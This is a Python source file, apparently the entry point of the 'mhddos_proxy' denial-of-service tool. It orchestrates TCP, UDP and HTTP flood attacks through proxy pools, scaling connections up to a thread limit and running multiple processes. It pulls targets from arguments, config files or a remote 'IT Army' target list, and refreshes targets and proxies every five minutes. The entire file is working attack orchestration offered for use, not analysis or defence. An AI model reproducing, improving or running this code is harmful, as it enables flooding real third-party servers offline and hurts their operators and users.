# @formatter:off
try: import colorama; colorama.init()
except:raise
# @formatter:on
import asyncio
import multiprocessing as mp
import random
import signal
import sys
import time
from functools import partial
from typing import List, Set, Union

from src.cli import init_argparse
from src.core import (
    CPU_COUNT, CPU_PER_PROCESS, DEFAULT_THREADS, FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS,
    IT_ARMY_CONFIG_URL, ONLY_MY_IP, REFRESH_OVERTIME, REFRESH_RATE,
    SCHEDULER_MAX_INIT_FRACTION, SCHEDULER_MIN_INIT_FRACTION, cl, logger
)
from src.i18n import DEFAULT_LANGUAGE, set_language, translate as t
from src.mhddos import AsyncTcpFlood, AsyncUdpFlood, AttackSettings, main as mhddos_main
from src.output import print_banner, print_progress, show_statistic
from src.proxies import ProxySet
from src.system import WINDOWS_WAKEUP_SECONDS, fix_ulimits, is_latest_version, setup_event_loop
from src.targets import Target, TargetsLoader


class GeminoCurseTaskSet:
    def __init__(
        self,
        loop: asyncio.AbstractEventLoop,
        runnables: List[AsyncTcpFlood],
        initial_capacity: int,
        max_capacity: int,
        fork_scale: int,
    ):
        self._loop = loop
        self._tasks = runnables
        self._initial_capacity = initial_capacity
        self._max_capacity = max_capacity
        self._fork_scale = fork_scale
        self._pending: Set[asyncio.Task] = set()
        self._shutdown_event: asyncio.Event = asyncio.Event()

    def _on_connect(self, runnable, f):
        try:
            if f.result() and len(self) <= self._max_capacity - self._fork_scale:
                for _ in range(self._fork_scale):
                    self._launch(runnable)
        except asyncio.TimeoutError:
            pass
        except Exception:
            pass

    def _on_finish(self, runnable, f):
        self._pending.remove(f)
        try:
            f.result()
        except asyncio.CancelledError as e:
            return
        except asyncio.TimeoutError:
            pass
        except Exception:
            pass
        finally:
            self._launch(runnable)

    def __len__(self) -> int:
        return len(self._pending)

    def _launch(self, runnable) -> None:
        if self._shutdown_event.is_set(): return
        on_connect = self._loop.create_future()
        on_connect.add_done_callback(partial(self._on_connect, runnable))
        task = self._loop.create_task(runnable.run(on_connect))
        task.add_done_callback(partial(self._on_finish, runnable))
        self._pending.add(task)

    async def loop(self) -> None:
        # the algo:
        # 1) for each runnable launch {initial_capacity} tasks
        # 2) as soon as connection ready on any of them, fork runner
        #    if max_capacity is enough
        # 3) on finish, restart corresponding runner
        #
        # potential improvement: find a way to downscale
        assert not self._shutdown_event.is_set(), "Can only be used once"
        try:
            for runnable in self._tasks:
                for _ in range(self._initial_capacity):
                    self._launch(runnable)
            while not self._shutdown_event.is_set():
                await asyncio.sleep(WINDOWS_WAKEUP_SECONDS)
        except asyncio.CancelledError as e:
            self._shutdown_event.set()
            for task in self._pending:
                task.cancel()
            raise e


async def run_udp_flood(runnable: AsyncUdpFlood) -> None:
    num_failures = 0
    while True:
        try:
            await runnable.run()
        except asyncio.CancelledError:
            raise
        except Exception:
            num_failures += 1
            if num_failures >= FAILURE_BUDGET_FACTOR:
                await asyncio.sleep(FAILURE_DELAY_SECONDS)
                num_failures = 0


async def run_ddos(args):
    is_old_version = not await is_latest_version()
    if is_old_version:
        logger.warning(
            f"{cl.CYAN}{t('A new version is available, update is recommended')}{cl.RESET}: "
            "https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n"
        )

    table, debug, http_methods, initial_capacity, fork_scale = (
        args.table, args.debug, args.http_methods,
        args.scheduler_initial_capacity, args.scheduler_fork_scale
    )
    if table:
        debug = False
    print_stats = debug or table

    # we are going to fetch proxies even in case we have only UDP
    # targets because the list of targets might change at any point in time
    threads = args.threads or DEFAULT_THREADS
    max_conns = fix_ulimits()
    if max_conns is not None:
        max_conns -= 50  # keep some for other needs
        if max_conns < threads:
            logger.warning(
                f"{cl.RED}{t('The number of threads has been reduced to')} {max_conns} "
                f"{t('due to the limitations of your system')}{cl.RESET}"
            )
            threads = max_conns

    logger.info(f"{cl.GREEN}{t('Launching the attack ...')}{cl.RESET}")

    # initial set of proxies
    use_my_ip = min(args.use_my_ip, ONLY_MY_IP)
    proxies = ProxySet(args.proxies, use_my_ip)
    if proxies.has_proxies:
        num_proxies = await proxies.reload()
        if num_proxies == 0:
            logger.error(f"{cl.RED}{t('No working proxies found - stopping the attack')}{cl.RESET}")
            return

    attack_settings = AttackSettings(
        requests_per_connection=args.rpc,
        dest_connect_timeout_seconds=10.0,
        drain_timeout_seconds=10.0,
        high_watermark=1024 << 4,
        # note that "generic flood" attacks switch reading off completely
        reader_limit=1024 << 2,
        socket_rcvbuf=1024 << 2,
    )
    loop = asyncio.get_event_loop()
    stats = []

    def prepare_flooder(target: Target, method: str) -> Union[AsyncUdpFlood, AsyncTcpFlood]:
        target_stats = target.create_stats(method)
        stats.append(target_stats)
        if target.has_options:
            target_rpc = int(target.option(Target.OPTION_RPC, "0"))
            settings = attack_settings.with_options(
                requests_per_connection=target_rpc if target_rpc > 0 else None,
                high_watermark=target.option(Target.OPTION_HIGH_WATERMARK),
            )
        else:
            settings = attack_settings

        kwargs = {
            'url': target.url,
            'ip': target.addr,
            'method': method,
            'event': None,
            'stats': target_stats,
            'proxies': proxies,
            'loop': loop,
            'settings': settings,
        }
        return mhddos_main(**kwargs)

    active_flooder_tasks = []
    tcp_task_group = None

    async def install_targets(targets) -> bool:
        nonlocal tcp_task_group

        # cancel running flooders
        if active_flooder_tasks:
            for task in active_flooder_tasks:
                task.cancel()
            active_flooder_tasks.clear()

        stats.clear()

        tcp_flooders, udp_flooders = [], []
        for target in targets:
            assert target.is_resolved, "Unresolved target cannot be used for attack"
            # udp://, method defaults to "UDP"
            if target.is_udp:
                udp_flooders.append(prepare_flooder(target, target.method or 'UDP'))
            # Method is given explicitly
            elif target.method is not None:
                tcp_flooders.append(prepare_flooder(target, target.method))
            # tcp://
            elif target.url.scheme == "tcp":
                tcp_flooders.append(prepare_flooder(target, 'TCP'))
            # HTTP(S), methods from --http-methods
            elif target.url.scheme in {"http", "https"}:
                for method in http_methods:
                    tcp_flooders.append(prepare_flooder(target, method))
            else:
                logger.error(f"{cl.RED}Unsupported scheme given: {target.url.scheme}{cl.RESET}")

        force_install = False
        if tcp_flooders:
            num_allowed_flooders = max(int(threads * SCHEDULER_MAX_INIT_FRACTION), 1)
            adjusted_capacity = initial_capacity
            num_flooders = len(tcp_flooders)
            if adjusted_capacity * num_flooders > num_allowed_flooders:
                adjusted_capacity = 1
                # If adjusting capacity is not enough, select random tcp_flooders
                if num_flooders > num_allowed_flooders:
                    random.shuffle(tcp_flooders)
                    tcp_flooders, num_flooders = tcp_flooders[:num_allowed_flooders], num_allowed_flooders
                    logger.info(f"{cl.MAGENTA}{t('Selected')} {num_flooders} {t('targets for the attack')}{cl.RESET}")
                    force_install = True

            # adjust settings to avoid situation when we have just a few
            # targets in the config (in this case with default CLI settings you are
            # going to start scaling from 3-15 tasks to 7_500)
            adjusted_capacity = max(
                adjusted_capacity,
                int(SCHEDULER_MIN_INIT_FRACTION * threads / num_flooders)
            ) if num_flooders > 1 else threads

            tcp_task_group = GeminoCurseTaskSet(
                loop,
                runnables=tcp_flooders,
                initial_capacity=adjusted_capacity,
                max_capacity=threads,
                fork_scale=fork_scale,
            )
            task = loop.create_task(tcp_task_group.loop())
            active_flooder_tasks.append(task)
        else:
            tcp_task_group = None

        for flooder in udp_flooders:
            task = loop.create_task(run_udp_flood(flooder))
            active_flooder_tasks.append(task)

        if not print_stats:
            for flooder in tcp_flooders + udp_flooders:
                logger.info(
                    f"{cl.YELLOW}{t('Target')}:{cl.BLUE} %s,"
                    f"{cl.YELLOW} {t('Port')}:{cl.BLUE} %s,"
                    f"{cl.YELLOW} {t('Method')}:{cl.BLUE} %s{cl.RESET}" % flooder.desc
                )

        return force_install

    if args.itarmy:
        targets_loader = TargetsLoader([], IT_ARMY_CONFIG_URL)
    else:
        targets_loader = TargetsLoader(args.targets, args.config)

    try:
        initial_targets, _ = await targets_loader.load(resolve=True)
    except Exception as exc:
        logger.error(f"{cl.RED}{t('Targets loading failed')} {exc}{cl.RESET}")
        initial_targets = []

    if not initial_targets:
        logger.error(f"{cl.RED}{t('No targets specified for the attack')}{cl.RESET}")
        return

    # Give user some time to read the output
    await asyncio.sleep(5)
    force_install_targets: bool = await install_targets(initial_targets)

    tasks = []

    async def stats_printer():
        it, cycle_start = 0, time.perf_counter()
        while True:
            await asyncio.sleep(REFRESH_RATE)
            try:
                passed = time.perf_counter() - cycle_start
                show_statistic(
                    stats,
                    table,
                    use_my_ip,
                    threads,
                    num_proxies=len(proxies),
                    overtime=bool(passed > REFRESH_RATE * REFRESH_OVERTIME),
                    print_banner_args=args if bool(table or it >= 10) else None
                )
            finally:
                it = it + 1 if it < 10 else 0
                cycle_start = time.perf_counter()

    # setup coroutine to print stats
    if print_stats:
        tasks.append(loop.create_task(stats_printer()))
    else:
        print_progress(threads, len(proxies), use_my_ip, False)

    async def reload_targets(delay_seconds: int = 30, force_install: bool = False):
        force_next = force_install
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                targets, changed = await targets_loader.load(resolve=True)

                if not targets:
                    logger.warning(
                        f"{cl.MAGENTA}{t('Empty config loaded - the previous one will be used')}{cl.RESET}"
                    )

                if targets and (changed or force_next):
                    force_next = await install_targets(targets)

            except asyncio.CancelledError as e:
                raise e
            except Exception as exc:
                logger.warning(f"{cl.MAGENTA}{t('Failed to (re)load targets config:')} {exc}{cl.RESET}")

    reload_after = 300
    # setup coroutine to reload targets
    targets_reloader = loop.create_task(
        reload_targets(delay_seconds=reload_after, force_install=force_install_targets)
    )
    tasks.append(targets_reloader)

    async def reload_proxies(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                if (await proxies.reload()) == 0:
                    logger.warning(
                        f"{cl.MAGENTA}{t('Failed to reload proxy list - the previous one will be used')}{cl.RESET}"
                    )

            except asyncio.CancelledError:
                raise
            except Exception:
                pass

    # setup coroutine to reload proxies
    if proxies.has_proxies:
        tasks.append(loop.create_task(reload_proxies(delay_seconds=reload_after)))

    await asyncio.gather(*tasks, return_exceptions=True)


def _main_signal_handler(ps, *args):
    logger.info(f"{cl.BLUE}{t('Shutting down...')}{cl.RESET}")
    for p in ps:
        if p.is_alive():
            p.terminate()
    sys.exit()


def _worker_process(args, lang):
    try:
        set_language(lang)  # set language again for the subprocess
        loop = setup_event_loop()
        loop.run_until_complete(run_ddos(args))
    except KeyboardInterrupt:
        sys.exit()


def main():
    args = init_argparse().parse_args()

    lang = args.lang or DEFAULT_LANGUAGE
    set_language(lang)

    if not any((args.targets, args.config, args.itarmy)):
        logger.error(f"{cl.RED}{t('No targets specified for the attack')}{cl.RESET}")
        sys.exit()

    num_copies = args.copies
    if num_copies > 1:
        max_copies = CPU_COUNT // CPU_PER_PROCESS
        if num_copies > max_copies:
            num_copies = max_copies
            logger.warning(
                f"{cl.RED}{t('The number of copies is automatically reduced to')} {max_copies}{cl.RESET}"
            )

        if num_copies > 1 and args.table:
            logger.warning(
                f"{cl.MAGENTA}{t('The `--table` flag cannot be used when running multiple copies')}{cl.RESET}"
            )
            args.table = False

    print_banner(args)

    processes = []
    mp.set_start_method("spawn")
    for _ in range(num_copies):
        p = mp.Process(target=_worker_process, args=(args, lang), daemon=True)
        processes.append(p)

    signal.signal(signal.SIGINT, partial(_main_signal_handler, processes, logger))
    signal.signal(signal.SIGTERM, partial(_main_signal_handler, processes, logger))

    for p in processes:
        p.start()

    for p in processes:
        p.join()


if __name__ == '__main__':
    main()
